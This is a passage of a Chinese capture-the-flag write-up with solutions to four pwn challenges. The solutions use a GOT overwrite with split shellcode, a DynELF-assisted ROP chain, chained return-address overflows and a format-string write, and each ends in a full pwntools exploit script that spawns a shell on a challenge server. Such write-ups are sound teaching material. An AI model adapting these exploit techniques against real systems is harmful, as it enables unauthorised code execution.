<h4 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h4><p>然后使用ida反编译。一边阅读一边修改函数名称，将整个过程走一遍。</p>
<p>其中只实现了add和delete。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223844741.png" alt="image-20201123223844741"></p>
<p>在add函数中，没有对index进行检查，因此可以通过输入index值基本实现将任意指针写到globle数组中。同时申请的chunk大小不能超过8字节，小于64位下chunk的最小值，实际分配的chunk每个用户数据大小是16字节（0x10）还有chunk头16字节。</p>
<p>对于获取输入的函数也有需要注意的地方：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224225947.png" alt="image-20201123224225947"></p>
<p>关于delete函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224310040.png" alt="image-20201123224310040"></p>
<h4 id="思路及利用-6"><a href="#思路及利用-6" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>首先值得注意的漏洞有两个，一个是数组的越界，一个是释放chunk后没有将指针置为null。但是由于题目限制了对chunk的写入数据大小，没法做到溢出，因此关于堆的攻击技巧基本上都不能用。</p>
<p>目标转为数组越界，同时注意到这道题目是堆栈可执行的。那么就可以考虑，将shellcode写入堆，利用数组越界将堆指针替换为got表项，更改相应函数的执行内容。结合下文出现的参数传递问题，选择free函数是比较合适的。</p>
<p>但是每一个chunk输入最多为7字节，只能将shellcode分散，利用jmp指令跳转。</p>
<p>关于shellcode的编写。选择系统调用execve(“/bin/sh”,0,0)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, xxx   <span class="comment">//xxx=&amp;(&quot;/bin/sh&quot;)  </span></span><br><span class="line">mov rsi,<span class="number">0</span>   </span><br><span class="line">mov rax, <span class="number">0x3b</span> <span class="comment">//rax=0x3b execve在64位下的系统调用号</span></span><br><span class="line">mov rdx,<span class="number">0</span>   </span><br><span class="line">syscall </span><br></pre></td></tr></table></figure>

<p>但是<code>mov rsi,0</code>太长，因此换为<code>xor rsi, rsi </code>利用异或实现。同理<code>mov rdx,0 </code>也是。</p>
<p>这里又出现个问题就是，‘/bin/sh’太长，不能直接传递。需要利用函数的参数传递，首先将‘/bin/sh’写入一个chunk，然后free。这时候根据64位的参数传递规则，‘/bin/sh’作为free的参数传递给了rdi。</p>
<p>接下来需要解决的是在不同chunk间的跳转。使用jmp short(\xeb)实现短转移。需要知道之间的相对偏移。</p>
<p>上文分析过每个chunk依次申请，大小一致都是0x20.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231022120.png" alt="image-20201123231022120"></p>
<p>chunk的状态如图所示，为了统一方便计算。将jmp指令放在最后，不足的用用nop填充（\x90）。那么即从当前chunk的jmp区跳到下一个chunk的data区，距离是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8+8+8（prevs_size+size+上个chunk的空）+1（一个未写入的空子节）&#x3D;0x19</span><br></pre></td></tr></table></figure>

<p><code>即跳转指令</code>\xeb\x19`。</p>
<p>最后就是得到free的got表项的地址相对于global的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084832598.png" alt="image-20201125084832598"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084904525.png" alt="image-20201125084904525"></p>
<p>偏移为<code>(0x0000000000202018-0x0000000002020A0)/8</code>得到-17.</p>
<p>所以得到exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note-service2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">42169</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"><span class="comment">#改写free的got</span></span><br><span class="line">add(<span class="number">-17</span>,asm(<span class="string">&quot;xor rsi,rsi&quot;</span>)+<span class="string">b&#x27;\x90\x90\xeb\x19&#x27;</span> )</span><br><span class="line">add(<span class="number">1</span>,asm(<span class="string">&quot;mov eax,0x3b&quot;</span>)+<span class="string">b&quot;\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,asm(<span class="string">&quot;xor rdx,rdx&quot;</span>)+<span class="string">b&quot;\x90\x90\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">3</span>,asm(<span class="string">&quot;syscall&quot;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231554223.png" alt="image-20201123231554223"></p>
<h3 id="10-pwn-100"><a href="#10-pwn-100" class="headerlink" title="10. pwn-100"></a>10. pwn-100</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211331082.png" alt="image-20210108211331082"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209164911452.png" alt="image-20201209164911452"></p>
<p><strong>考察知识点：栈溢出、DynELF</strong></p>
<h4 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209165235082.png" alt="image-20201209165235082"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209165320208.png" alt="image-20201209165320208"></p>
<p>整个程序很简单，只发现一个栈溢出漏洞，而且开启了堆栈不可执行。</p>
<h4 id="思路及利用-7"><a href="#思路及利用-7" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>思路显然就是利用栈溢出漏洞，编写gadget执行system。</p>
<p>首先需要泄露地址。这里可以借助pwntools的dynelf函数。</p>
<blockquote>
<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块.</p>
</blockquote>
<p>代码框架如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">&#x27;./xxx&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">  <span class="comment">#各种预处理</span></span><br><span class="line">  payload = <span class="string">&quot;xxxxxxxx&quot;</span> + address + <span class="string">&quot;xxxxxxxx&quot;</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="comment">#各种处理</span></span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&quot;./xxx&quot;</span>))      <span class="comment">#初始化DynELF模块 </span></span><br><span class="line">systemAddress = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，DynELF需要能够泄露信息的漏洞反复触发，因此每一次泄露需要最终返回到start。</p>
<p>整个程序十分简单，能够用来输出的只有puts函数。给puts函数传参，需要用到<code>pop rdi，ret</code>这样的gadget。</p>
<p>使用ROPgadget查找。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209170839114.png" alt="image-20201209170839114"></p>
<p>得到需要的地址如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">poprdi = <span class="number">0x0000000000400763</span></span><br><span class="line">start = start_addr = <span class="number">0x400550</span></span><br></pre></td></tr></table></figure>



<p>最终得到如下的泄露函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>		<span class="comment">#填充0x40+8位垃圾数据</span></span><br><span class="line">    payload += p64(poprdi)	<span class="comment">#覆盖ret，执行pop rdi，ret</span></span><br><span class="line">    payload += p64(addr)	<span class="comment">#addr——&gt;rdi</span></span><br><span class="line">    payload += p64(puts_plt)<span class="comment">#ret语句执行的地址，调用puts函数，相当于puts(addr)</span></span><br><span class="line">    payload += p64(start)	<span class="comment">#puts函数调用后的ret，返回开始。</span></span><br><span class="line">    payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">    up = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> <span class="comment">#puts函数的接受处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"> <span class="comment">#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了；以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span></span><br><span class="line">        c = p.recv(numb = <span class="number">1</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = data[:<span class="number">-1</span>]</span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data += c</span><br><span class="line">            up = c</span><br><span class="line">    data = data[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;./pwn-100&#x27;</span>))</span><br><span class="line">system = d.lookup(<span class="string">&#x27;__libc_system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>完成泄露system地址之后，就是执行system函数，传递“/bin/sh”参数得到shell了。</p>
<p>观察整个程序，并没有改写got的余地与必要。同时之前寻找<code>pop rdi，ret</code>时发现了足够的gadget。因此，考虑通过gadget传递参数执行system函数。</p>
<p>那么，第一步就是将‘/bin/sh’写入到内存的某个地方。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209172219756.png" alt="image-20201209172219756"></p>
<p>可以看到bss段是可写的，于是，利用read函数，将‘/bin/sh’写入bss段。</p>
<p>read函数一共有要三个传参寄存器rdi, rsi, rdx。</p>
<p>而在 libc_csu_init 中，有一段万能gadget。</p>
<p> <img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209173406970.png" alt="image-20201209173406970"></p>
<p>可以先传给r13，r14，r15再mov到相应寄存器。</p>
<p>于是又如下payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sh = <span class="number">0x601000</span></span><br><span class="line">gadget = <span class="number">0x40075a</span> <span class="comment"># pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret</span></span><br><span class="line">gadget1 = <span class="number">0x400740</span> <span class="comment"># mov %r13,%rdx;mov %r14,%rsi;mov %r15d,%edi; callq  *(%r12,%rbx,8)</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(gadget) </span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx = 0</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp = 1</span></span><br><span class="line">payload += p64(read_plt)<span class="comment"># r12 = read_got</span></span><br><span class="line">payload += p64(<span class="number">8</span>)<span class="comment"># r13 = 8,count;读入8个字节</span></span><br><span class="line">payload += p64(sh)<span class="comment"># r14 = sh,* buf = sh</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># r15 = 0,fd = 0;标准输入</span></span><br><span class="line">payload += p64(gadget1)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">56</span><span class="comment">#gadget11需要56个栈空间。</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>至此完成了，‘/bin/sh’的输入，最后就是调用system函数。只需要将sh地址传给rdi调用system即可。</p>
<p>最终完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-100&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">54991</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn-100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">poprdi = <span class="number">0x0000000000400763</span></span><br><span class="line">start = start_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">    payload += p64(poprdi)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(puts_plt)</span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">    up = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = p.recv(numb = <span class="number">1</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = data[:<span class="number">-1</span>]</span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data += c</span><br><span class="line">            up = c</span><br><span class="line">    data = data[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=elf)</span><br><span class="line">system = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x601000</span></span><br><span class="line">gadget = <span class="number">0x40075a</span> <span class="comment"># pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret</span></span><br><span class="line">gadget1 = <span class="number">0x400740</span> <span class="comment"># mov %r13,%rdx;mov %r14,%rsi;mov %r15d,%edi; callq  *(%r12,%rbx,8)</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(gadget) </span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx = 0</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp = 1</span></span><br><span class="line">payload += p64(read_got)<span class="comment"># r12 = read_got</span></span><br><span class="line">payload += p64(<span class="number">8</span>)<span class="comment"># r13 = 8,count;读入8个字节</span></span><br><span class="line">payload += p64(sh)<span class="comment"># r14 = sh,* buf = sh</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># r15 = 0,fd = 0;标准输入</span></span><br><span class="line">payload += p64(gadget1)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">payload += p64(poprdi)</span><br><span class="line">payload += p64(sh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209175028067.png" alt="image-20201209175028067"></p>
<h3 id="11-反应釜开关控制"><a href="#11-反应釜开关控制" class="headerlink" title="11. 反应釜开关控制"></a>11. 反应釜开关控制</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211458145.png" alt="image-20210108211458145"><img src="/posts/5600bec/image-20201123091430114.png" alt="image-20201123091430114"></p>
<p><strong>考察知识点：栈溢出</strong></p>
<h4 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="/posts/5600bec/image-20201123091242758.png" alt="image-20201123091242758"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231711816.png" alt="image-20201123231711816"></p>
<p><img src="/posts/5600bec/image-20201123091319181.png" alt="image-20201123091319181"></p>
<p><img src="/posts/5600bec/image-20201123091712759.png" alt="image-20201123091712759"></p>
<p>这道题感觉应该是不给附件中的可执行文件盲打才对，不然知道可执行文件用ida反编译，就知道是很就简单的栈溢出。通过三次栈溢出，覆盖返回地址跳转到后门函数。</p>
<h4 id="思路及利用-8"><a href="#思路及利用-8" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>首先保护只有堆栈不可执行。同时是使用gets函数获取输入。那么就可以随意的进行栈溢出。那么思路就很简单了。先通过栈溢出覆盖返回地址，从main跳到easy，从easy跳到normal，从normal跳到shell。</p>
<p>需要注意的是，ida显示的与rbp的距离有时候是不准确的，最好是通过gdb动态调试得到。这里为了方便，直接用来ida显示，成功得到shell。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./reactionkettle&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">49151</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">easy = p.recv(<span class="number">8</span>)</span><br><span class="line">easy =  <span class="built_in">int</span>(easy,<span class="number">16</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(easy)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">normal = p.recv(<span class="number">8</span>)</span><br><span class="line">normal  =  <span class="built_in">int</span>(normal,<span class="number">16</span>) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x188</span>+p64(normal)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">shell = p.recv(<span class="number">8</span>)</span><br><span class="line">shell = <span class="built_in">int</span>(shell,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(shell)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="12-实时数据监测"><a href="#12-实时数据监测" class="headerlink" title="12. 实时数据监测"></a>12. 实时数据监测</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211606429.png" alt="image-20210108211606429"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083521011.png" alt="image-20201125083521011"></p>
<p><strong>考察知识点：格式化字符串</strong></p>
<h4 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083728103.png" alt="image-20201125083728103"></p>
<p>显然目标就是将key的值改为35795746，也就是0x02223322。这里有用到ida一个技巧，ida里字符串是以编码的值存储的，找到对应的值，选中，按下a就可以转为字符串显示。这里的”The location of key is %08x, and its value is %08x,not the 0x02223322. (╯°Д°)╯︵ ┻━┻\n”就是这样得来的。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084015380.png" alt="image-20201125084015380"></p>
<p>这显然是一个格式化字符串漏洞。</p>
<h4 id="思路及利用-9"><a href="#思路及利用-9" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>根据上述分析，只需要输入一个格式化字符串，将&amp;key改为0x02223322就可以。</p>
<p>那么首先，寻找格式化字符串的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084321047.png" alt="image-20201125084321047"></p>
<p>可以看到偏移为12.</p>
<p>使用ida查询key的地址</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084627078.png" alt="image-20201125084627078"></p>
<p>然后借助fmtstr_payload快速构造格式化字符串。<code>fmtstr_payload(12,&#123;0x804A048:0x02223322&#125;)</code></p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./实时数据监测&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52658</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>,&#123;<span class="number">0x804A048</span>:<span class="number">0x02223322</span>&#125;)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084651226.png" alt="image-20201125084651226"></p>
